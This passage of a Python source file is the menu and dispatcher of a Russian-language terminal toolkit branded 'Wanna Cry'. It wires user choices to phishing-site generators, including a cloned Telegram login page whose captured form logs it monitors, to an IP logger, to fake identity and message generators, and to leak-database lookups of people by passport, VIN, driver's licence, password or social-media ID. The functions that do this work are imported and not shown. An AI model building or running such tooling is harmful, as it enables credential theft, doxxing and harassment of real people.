    █   [12] Поиск По вод.удостоверению     █   [15] Поиск По Password               █       [18] Поиск По Auto Number           █
    █                                       █                                        █                                           █ 
    ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
    █                                       █                                        █                                           █
    █   [19] Поиск По Паспорта              █   [22] Поиск По Telegram Username      █       [25] Поиск По Facebook Nickname     █          
    █   [20] Поиск По VIN                   █   [23] Поиск По Telegram Nickname      █       [26] Ban Word                       █
    █   [21] Поиск По VK ID                 █   [24] Поиск По Facebook ID            █       [27] Поиск По VK Nickname           █
    █                                       █                                        █                                           █ 
    ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████ 

'''


menu_banner_2 = '''
    ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
    █                                                                                                                            █
    █               ▄█     █▄     ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████       ▄████████    ▄████████ ▄██   ▄                █
    █              ███     ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███      ███    ███   ███    ███ ███   ██▄              █
    █              ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▀    ███    ███ ███▄▄▄███              █
    █              ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███         ▄███▄▄▄▄██▀ ▀▀▀▀▀▀███              █
    █              ███     ███ ▀███████████ ███   ███ ███   ███ ▀███████████      ███        ▀▀███▀▀▀▀▀   ▄██   ███              █
    █              ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▄  ▀███████████ ███   ███              █
    █              ███ ▄█▄ ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    ███   ███    ███ ███   ███              █
    █               ▀███▀███▀    ███    █▀   ▀█   █▀   ▀█   █▀    ███    █▀       ████████▀    ███    ███  ▀█████▀               █
    █                                                                                          ███    ███                        █
    █                                                                                                                            █
    ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
    █                                                      VERSION: 1.7.0                                                        █ 
    █                                                     Change Theme:> T                                                       █ 
    ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
    █                                                     dev: @suidcider                                                        █ 
    █                                                 Welcome To Menu Wanna Cry                                                  █ 
    █                                                    Studio: @thiasoft                                                       █ 
    ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
    █                                       █                                        █                                           █
    █   [55] Parsing JSON                   █   [31] IP Logger                       █       [61] Generate a name                █          
    █   [56] Parsing XML                    █   [30] Honeypot                        █       [62] Генератор фишинг-сайтов        █
    █   [57] Parsing HTML                   █   [60] Generate Password               █       [63] Генератор фальшивых Email      █
    █                                       █                                        █                                           █ 
    ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
    █                                       █                                        █                                           █
    █   [64] Генератор фальшивых сообщений  █   [67] Генератор Фишинг-Сайта TT       █       [70] Generate ASCII LOGO            █          
    █   [65] Генератор фальшивых Social-Nw  █   [68] Generate Fake Info              █       [71] Generator Trollinga            █
    █   [66] Генератор Фишинг-Сайта Tg      █   [69] Generate ASCII ART              █       [72] Generator Provakation          █
    █                                       █                                        █                                           █ 
    ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
    █                                       █                                        █                                           █
    █   [46] Parsing CSV                    █   [49] Parsing HTML links              █       [52] Parsing HTML Elements          █          
    █   [47] Parsing TXT                    █   [50] Parsing HTML IMG                █       [53] Parsing JSON Keys              █
    █   [48] Parsing TITLE HTML             █   [51] Parsing HTML Paraphrases        █       [54] Parsing Logs                   █
    █                                       █                                        █                                           █ 
    ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

'''

current_theme = Colors.red_to_yellow

def change_pystyle_colors():
    global current_theme
    Write.Print("Выберите цвет для баннера WANNA-CRY:\n", Colors.red_to_yellow, interval=0.000001)
    Write.Print("1. Red to Blue\n", Colors.red_to_blue, interval=0.000001)
    Write.Print("2. Red to Black\n", Colors.red_to_black, interval=0.000001)
    Write.Print("3. Red to Green\n", Colors.red_to_green, interval=0.000001)
    Write.Print("4. Red to Purple\n", Colors.red_to_purple, interval=0.000001)
    Write.Print("5. Light Red\n", Colors.light_red, interval=0.000001)
    Write.Print("6. Green to White\n", Colors.green_to_white, interval=0.000001)
    Write.Print("7. Green to Yellow\n", Colors.green_to_yellow, interval=0.000001)
    Write.Print("8. Green to Blue\n", Colors.green_to_blue, interval=0.000001)
    Write.Print("9. Gray\n", Colors.gray, interval=0.000001)
    Write.Print("10. Green to Red\n", Colors.green_to_red, interval=0.000001)
    Write.Print("11. Green to Black\n", Colors.green_to_black, interval=0.000001)
    Write.Print("12. Green to Cyan\n", Colors.green_to_cyan, interval=0.000001)
    Write.Print("13. Purple to Red\n", Colors.purple_to_red, interval=0.000001)
    Write.Print("14. Purple\n", Colors.purple, interval=0.000001)
    Write.Print("15. Purple to Blue\n", Colors.purple_to_blue, interval=0.000001)
    Write.Print("16. Yellow to Red\n", Colors.yellow_to_red, interval=0.000001)
    Write.Print("17. Yellow to Green\n", Colors.yellow_to_green, interval=0.000001)
    Write.Print("20. Cyan to Green\n", Colors.cyan_to_green, interval=0.000001)
    Write.Print("21. Cyan to Blue\n", Colors.cyan_to_blue, interval=0.000001)
    Write.Print("22. Blue to Red\n", Colors.blue_to_red, interval=0.000001)
    Write.Print("23. Blue to Green\n", Colors.blue_to_green, interval=0.000001)
    Write.Print("25. Light Blue\n", Colors.light_blue, interval=0.000001)
    Write.Print("26. Light Green\n", Colors.light_green, interval=0.000001)
    Write.Print("29. Light Gray\n", Colors.light_gray, interval=0.000001)
    Write.Print("30. Dark Red\n", Colors.dark_red, interval=0.000001)
    Write.Print("31. Dark Green\n", Colors.dark_green, interval=0.000001)
    Write.Print("32. Dark Blue\n", Colors.dark_blue, interval=0.000001)
    Write.Print("35. Dark Gray\n", Colors.dark_gray, interval=0.000001)
    Write.Print("36. Rainbow\n", Colors.rainbow, interval=0.000001)
    theme_choice = Write.Input("Ваш выбор: ", Colors.red_to_yellow, interval=0.000001)

    if theme_choice == '1':
        current_theme = Colors.red_to_blue
    elif theme_choice == '2':
        current_theme = Colors.red_to_black
    elif theme_choice == '3':
        current_theme = Colors.red_to_green
    elif theme_choice == '4':
        current_theme = Colors.red_to_purple
    elif theme_choice == '5':
        current_theme = Colors.light_red
    elif theme_choice == '6':
        current_theme = Colors.green_to_white
    elif theme_choice == '7':
        current_theme = Colors.green_to_yellow
    elif theme_choice == '8':
        current_theme = Colors.green_to_blue
    elif theme_choice == '9':
        current_theme = Colors.gray
    elif theme_choice == '10':
        current_theme = Colors.green_to_red
    elif theme_choice == '11':
        current_theme = Colors.green_to_black
    elif theme_choice == '12':
        current_theme = Colors.green_to_cyan
    elif theme_choice == '13':
        current_theme = Colors.purple_to_red
    elif theme_choice == '14':
        current_theme = Colors.purple
    elif theme_choice == '15':
        current_theme = Colors.purple_to_blue
    elif theme_choice == '16':
        current_theme = Colors.yellow_to_red
    elif theme_choice == '17':
        current_theme = Colors.yellow_to_green
    elif theme_choice == '20':
        current_theme = Colors.cyan_to_green
    elif theme_choice == '21':
        current_theme = Colors.cyan_to_blue
    elif theme_choice == '22':
        current_theme = Colors.blue_to_red
    elif theme_choice == '23':
        current_theme = Colors.blue_to_green
    elif theme_choice == '25':
        current_theme = Colors.light_blue
    elif theme_choice == '26':
        current_theme = Colors.light_green
    elif theme_choice == '29':
        current_theme = Colors.light_gray
    elif theme_choice == '30':
        current_theme = Colors.dark_red
    elif theme_choice == '31':
        current_theme = Colors.dark_green
    elif theme_choice == '32':
        current_theme = Colors.dark_blue
    elif theme_choice == '35':
        current_theme = Colors.dark_gray
    elif theme_choice == '36':
        current_theme = Colors.rainbow
    else:
        Write.Print("Неверный выбор, используется цвет по умолчанию (Красный к жёлтому).\n", Colors.red_to_white,
                    interval=0.000001)
        current_theme = Colors.red_to_yellow

    Write.Print("Тема успешно изменена.\n", current_theme, interval=0.000001)
def logos(req):
    Write.Print(f"""
   ▄█     █▄     ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████       ▄████████    ▄████████ ▄██   ▄         
  ███     ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███      ███    ███   ███    ███ ███   ██▄        
  ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▀    ███    ███ ███▄▄▄███        
  ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███         ▄███▄▄▄▄██▀ ▀▀▀▀▀▀███       
  ███     ███ ▀███████████ ███   ███ ███   ███ ▀███████████      ███        ▀▀███▀▀▀▀▀   ▄██   ███       
  ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▄  ▀███████████ ███   ███       
  ███ ▄█▄ ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    ███   ███    ███ ███   ███        
   ▀███▀███▀    ███    █▀   ▀█   █▀   ▀█   █▀    ███    █▀       ████████▀    ███    ███  ▀█████▀         
                                                                              ███    ███   

███████████████████████████████████████████████████████████████████████████████████████████████████████

                                  REQUEST: {req}                                       
                                  METHOD: LEAK OSINT            

███████████████████████████████████████████████████████████████████████████████████████████████████████
    """, current_theme, interval=0.0005)

def main():
    global current_theme
    print(Colorate.Horizontal(current_theme, Center.XCenter(menu_banner_1)))

    while True:
        choice = Write.Input("\nВыберите опцию : ", current_theme, interval=0.0000005)

        if choice == '1':
            phone_number = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            search_by_htmlweb(phone_number)
        elif choice == '2':
            hostname = Write.Input("Введите запрос: ", current_theme,interval=0.000005)
            get_cert_info(hostname)
        elif choice == '3':
            query = input("Введите запрос: ")
            search_anime(query)
        elif choice == '4':
            query = input("Введите запрос: ")
            search_anime(query)
        elif choice == '5':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '6':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '7':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '8':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '9':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '10':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '11':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '12':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '13':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '14':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '15':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '16':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '17':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '18':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '19':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '20':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '21':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '22':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '23':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '24':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '25':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '27':
            req = Write.Input("Введите запрос: " , current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '26':
            Write.Print("Введите текст для преобразования в язык M33T:", current_theme, interval=0.0000005)
            text = input()

            m33t_text = convert_to_m33t(text)

            Write.Print("Текст на языке M33T:", current_theme, interval=0.0000005)
            Write.Print(m33t_text, current_theme, interval=0.0000005)

        elif choice == '27':
            req = Write.Input("Введите запрос: ", current_theme, interval=0.05)
            logos(req)
            api_search(req)
        elif choice == '30':
            honeypot.start_honeypot()
        elif choice == '31':
            iplogger.generate_unique_link()
            iplogger.run_server()
        elif choice == '46':
            parse_csv()
        elif choice == '47':
            parse_txt()
        elif choice == '48':
            parsing_html_title()
        elif choice == '49':
            parse_html_links()
        elif choice == '50':
            parse_html_img()
        elif choice == '51':
            parsing_html_paraphrases()
        elif choice == '52':
            parse_html_elements()
        elif choice == '53':
            parse_json_keys()
        elif choice == '54':
            parse_logs()
        elif choice == '55':
            parse_json()
        elif choice == '56':
            parse_xml()
        elif choice == '57':
            parse_html()
        elif choice == "62":
            site_name = Write.Input("Enter the site name: ", current_theme, interval=0.0000005)
            login_url = Write.Input("Enter the login URL: ", current_theme, interval=0.0000005)
            output_file = Write.Input("Enter the output file name: ", current_theme, interval=0.0000005)
            generate_phishing_site(site_name, login_url, output_file)
            log_message(f"Phishing site for {site_name} generated and saved to {output_file}", current_theme)
            log_message("Phishing site emulates the specified login page", current_theme)

        elif choice == "66":
            login_url = Write.Input("Enter the URL where the form data should be sent: ", current_theme,
                                    interval=0.0000005)
            output_file = Write.Input("Enter the output file name: ", current_theme, interval=0.0000005)
            fishingtelegram.generate_telegram_phishing_site(output_file, login_url)

            fishingtelegram.log_message(f"Phishing site for Telegram generated and saved to {output_file}", current_theme)
            fishingtelegram.log_message("Phishing site emulates Telegram login", current_theme)

            fishingtelegram.monitor_logs(current_theme)

        elif choice == "68":
            Write.Print(generate_fake_identity(), current_theme , interval=0.005)

        elif choice == '69':
            image_path = Write.Input("Введите путь к изображению (PNG/JPG): ",current_theme,interval=0.05)
            output_file = Write.Input("Введите имя для ASCII-арт файла (без расширения): ",current_theme,interval=0.05)
            image_to_ascii(image_path, output_file)
        elif choice == "70":
            mains()
        elif choice == "71":
            main_project_function()
        elif choice == "72":
            main_project_function()
        elif choice == "02":
            print(Colorate.Horizontal(current_theme, Center.XCenter(menu_banner_2)))
        elif choice == "01":
            print(Colorate.Horizontal(current_theme, Center.XCenter(menu_banner_1)))
        elif choice.lower() == "t":
            change_pystyle_colors()
        else:
            Write.Print("\n[ERROR] Неверный выбор. Пожалуйста, выберите правильный пункт.", Colors.red, interval=0.0001)

if __name__ == "__main__":
    main()
